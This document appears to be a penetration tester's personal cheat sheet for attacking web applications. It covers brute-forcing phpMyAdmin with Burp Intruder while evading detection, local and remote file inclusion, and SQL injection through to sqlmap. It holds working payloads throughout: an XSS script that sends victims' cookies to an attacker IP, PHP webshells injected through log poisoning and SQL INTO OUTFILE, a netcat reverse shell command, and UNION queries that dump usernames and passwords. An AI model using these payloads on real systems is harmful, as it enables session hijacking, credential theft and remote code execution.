ALWAYS CHECK FOR LACK OF SANITIZATION OF 
<>'"{};

>ADMIN CONSOLES:<<<<<
TRY DEFAULTS, TRY TO USE PREVIOUSLY ENUMERATED INFORMATION, MAYBE BRUTEFORCE BUT IT'S LOUD AND RISKY

>BURP SUITE INTRUDER:
CHECK FOR SET_SESSION AND TOKEN VALUES
USE PROXY TO GRAB A REQUEST AND SEND IT TO INTRUDER
THIS POPULATES THE FIELDS IN INTRUDER
POSITIONS DETERMINES WHERE PAYLOADS IN INTRUDER ARE SET, IF YOU DO NOT WANT A POSTION CHANGED UNMARK THE WEIRD S
YOU CAN USE THE S TO BEAT BRUTEFORCE DETECTION Y SETTING IT ON COOKIE VALUE, SET SESSION, AND TOKEN
YOU CAN SET THE ATTACK TYPE TO PITCHFORK
CLICK OPTIONS AND THEN ADD FOR A RECURSIVE GREP
RECURSIVE GREP CAN BE USED TO GRAB A FIELD FROM ONE RESPONSE AND PASTE IT INTO THE NEXT
SCROLL DOWN TO SET SESSION HIDDEN, AND CLICK AND SELECT THE VALUE WHICH WILL SET THE START AFTER AND END AT DELIMITER FIELDS
CLICK OK AND THEN GO TO INTRUDER>2>OPTIONS AND CLICK ADD TO DEFINE ANOTHER EXTRACT
SELECT CONTENTS OF THE TOKEN FIELD
CLICK OK
CLICK THE PAYLOADS TAB
SELECT RECURSIVE GREP FOR THE FIRST TWO
USE YOUR OPTIONS THAT AUTO-FILLED EARLIER

_session" value="
TO
"/>Log

MAKE A THIRD PAYLOAD FOR THE PASSWORD VALUE, USE SIMPLE LIST
ADD COMMON PASSWORDS

SET PAYLOAD FOUR AS REVERSE GREP FOR TOKEN EXTRACT OF THE TOKEN VALUE AND SET IT FROM 
.php" /><input type="hidden" name="token" value=" 
TO
"/><fieldset>

THE FOUR POSITIONS SHOULD BE 
PHPMYADMIN COOKIE
set_session
pma_password
token

302 RESPONSE = WINRAR

>XSS:<<<<<<
CHECK FOR CHARACTERS LISTED IN THE BEGINNING OF THIS POST
COOKIE SNATCHIN:
WE CAN USE SOMETHING LIKE 
<script>new Image().src="http://YOUR.IP.ADD.HERE/dope.jpg?output="+document.cookie;</script>
AND OPEN A LISTENER
sudo nc -nvlp 80
TO STEAL AN AUTHENTICATION TOKEN, LIKE PHPESSID
AND USE COOKIE EDITOR TO ALTER OURS TO MATCH AN ADMINS COOKIE
THEN NAVIGATE TO /ADMIN.PHP OR THE ADMIN PORTAL
AND BAM, WE'RE AUTHENTICATED

ALSO CHECK BEEF FOR OTHER XSS TOOLS

>LFI:<<<<<

ALWAYS LOOK FOR FILE EXTENSIONS IN URL STRINGS FOR MEANS OF DIRECTORY TRAVERSAL
SOMETHING.php?file= IS NORMALLY A DEAD GIVEAWAY FOR LOCAL FILE INCLUSION TO BE TESTED

LFI CAN BE LEVERAGED A NUMBER OF WAYS
I HAVE CREATED A SIMPLE SCRIPT IN THE USEFULS SCRIPTS SECTION TO CHECK FOR A NUMBER OF FILES THAT CAN BE READ USING LFI 
CHECK IT OUT, COPY BOTH OF THE FILES INTO A NEW DIRECTORY AND RUN IT AGAINST THE TARGET, SORT BY SIZE AND 
IGNORE ANY 0 BYTE FILES

CONTAMINATING LOGS:

IF YOU HAVE A WAY TO READ APACHE LOGS OR OTHER LOGS THAT DOCUMENT CONNECTION INFORMATION, IF YOU CAN CONTAMINATE THEM WITH PHP
YOU SHOULD BE ABLE TO GET THE PHP TO EXECUTE USING AN LFI VULNERABILITY
FOR EXAMPLE FOR APACHE LOGS YOU COULD USE
nc -nv IPP.ADD.HE.RE 80
TO CONNECT TO THE APACHE SERVER WITH NETCAT AND THEN TYPE
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
AND DESPITE A BAD REQUEST RETURN, IT WILL BE WRITTEN TO THE LOG FILE
SO IF YOU WERE TO LEVERAGE THE LFI POINT AGAIN AND APPEND A COMMAND WITH &CMD= I.E.
http://IP.ADD.HE.RE/lfipage.php?file=/path/to/log/file&cmd=nc -nlvp UR.IP.ADD.HERE 3777 -e /bin/bash
YOU COULD FORWARD A BASH SHELL VIA A NETCAT LISTENER BACK TO YOURSELF WITH THE PRIVILEDGES OF THE WEB SERVER

>RFI:<<<<<

RFI (REMOTE FILE INCLUSION) IS ALOT LIKE LFI (LOCAL FILE INCLUSION), EXCEPT AS THE NAME IMPLIES YOU CAN ALSO LOAD REMOTELY
HOSTED FILES TO LEVERAGE THIS YOU CAN SPIN UP A WEBSERVER LIKE APACHE ON YOUR HOST MACHINE AND USE IT TO HOST MORE ELABORATE 
WEBSHELLS THAT YOU CAN DIRECT MULTIPLE SERVERS WITH THE SAME VULNERABILITY TO
THE SYNTAX FOR EXPLOITING THIS VULN IS A LITTLE DIFFERENT OF COURSE I.E.
http://IP.ADD.HE.RE/lfipoint?file=http://YOUR.IP.ADD.HERE/hostedfile.php
OR
http://IP.ADD.HE.RE/lfipoint?file=http://YOUR.IP.ADD.HERE/hostedfile.txt&cmd=ipconfig
WEBSHELLS ARE LOCATED AT /usr/share/webshells

>PHP WRAPPERS:<<<
WE MIGHT ALSO WANT TO CHECK IF 
http://IP.ADD.HE.RE/lfipoint?file=data:text/plain,<?php echo shell_exec("ipconfig") ?>
WORKS IN SITUATIONS WHERE A FILE= OPERAND IS USED BUT WE DONT HAVE THE ABILITY TO LEVERAGE LFI OR RFI
"IPCONFIG" CAN OF COURSE BE CHANGED TO A COMMAND FOR STARTING A REVERSE SHELL

>SQL INJECTION:<<<<<

AUTHENTICATION BYPASS:
A STANDARD FORM OF BREAKING SQL QUERIES FOR AUTH BYPASS IS
use' or 1=1;#
OR TO LIMIT OUTPUT TO 1 ROW
use' or 1=1 LIMIT 1;#

ENUMERATING THE DATABASE:
YOU CAN USE A MODIFIED URL LIKE
http://IP.ADD.HE.RE/page.php?id=1 order by 1
TO SORT RESULTS BASED ON THE VALUES IN THE FIRST COLUMN
WE CAN ADD 1 TO ORDER BY EACH TIME UNTIL WE GET AN ERROR TO ENUMERATE ALL THE COLUMNS
THIS CAN BE AUTOMATED USING BURP SUITE BY
LAUNCHING BURP SUITE AND TURNING OFF INTERCEPT
CAPTURE THE QUERY USING THE PROXY
SEND IT TO REPEATER
SEND THE FIRST ONE AND SEARCH FOR ERROR
INCRIMENT BY ONE, AND SEARCH FOR ERROR UNTIL ONE IS FOUND

IDENTIFYING OUTPUT ON PAGE:
AFTER WE HAVE IDENTIFIED THE NUMBER OF COLUMNS IN THE DATABASE WE CAN USE A UNION STATEMENT TO SHOW ON THE PAGE WHERE THE 
OUTPUT IS BEING DISPLAYED I.E. IN THE CASE OF 3 COLUMNS
http://IP.ADD.HE.RE/page.php?id=1 union all select 1, 2, 3
AFTER FINDING A HOME FOR YOUR OUTPUT YOU CAN THEN OUTPUT THE RESULTS OF QUERIES TO THAT FIELD
http://IP.ADD.HE.RE/page.php?id=1 union all select 1, 2, @@version
WILL OUTPUT A MARIADB VERSION
http://IP.ADD.HE.RE/page.php?id=1 union all select 1, 2, user()
WILL OUTPUT WHAT USER IS BEING USED FOR QUERIES
http://IP.ADD.HE.RE/page.php?id=1 union all select 1, 2, table_name from information_schema.tables
WILL OUTPUT THE LAYOUT OF THE DATABASE
http://IP.ADD.HE.RE/page.php?id=1 union all select 1, 2, column_name from information_schema.columns where table_name='users'
WILL RETRIEVE COLUMN NAMES FROM A TABLE, IN THIS CASE THE USERS TABLE

http://IP.ADD.HE.RE/page.php?id=1 union all select 1, username, password from users
THIS WILL OUTPUT THE USERNAME IN COLUMN 2 AND PASSWORD IN COLUMN 3, GIVEN users IS THE USER TABLE
AND THE column_names MATCH user AND password

SQL INJECTION TO CODE EXECUTION:

IF YOU CAN SUCCESSFULLY LOAD A FILE USING 
http://IP.ADD.HE.RE/page.php?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')
TRY TO USE OUTFILE I.E.
http://IP.ADD.HE.RE/page.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/webshell.php'
OR A SIMILAR LOCATION BASED ON DISTRO AND WEBSERVER TO GIVE YOURSELF A WAY TO PASS COMMANDS, USE THIS TO START A REVERSE SHELL

>SQLMAP:<<<<<

SQLMAP CAN BE USED TO AUTOMATE SQL INJECTION THE SYNTAX IS
sqlmap -u http://IP.ADD.HE.RE/page.php?id=1 -p "id"
WHERE 
-u SPECIFIES URL TO TEST
-p SPECIFIES PARAMETER TO TEST
WHICH IN SOME CASES CAN ALSO DETERMINE UNDERLYING DATABASE
IN CASES IT DOES YOU MAY WANT TO RUN
sqlmap -u http://IP.ADD.HE.RE/page.php?id=1 -p "id" --dbms=mysql --dump
TO ATTEMPT TO DUMP THE DATABASE WHERE
--dbms= SPECIFIES TYPE OF DATABASE
--dump TELLS SQLMAP TO ATTEMPT TO DUMP THE DB

OR EVEN ATTEMPT 
sqlmap -u http://IP.ADD.HE.RE/page.php?id=1 -p "id" --dbms=mysql --dump --os-shell
TO ATTEMPT TO GET A RUDIMENTARY SHELL ON THE TARGET SERVER
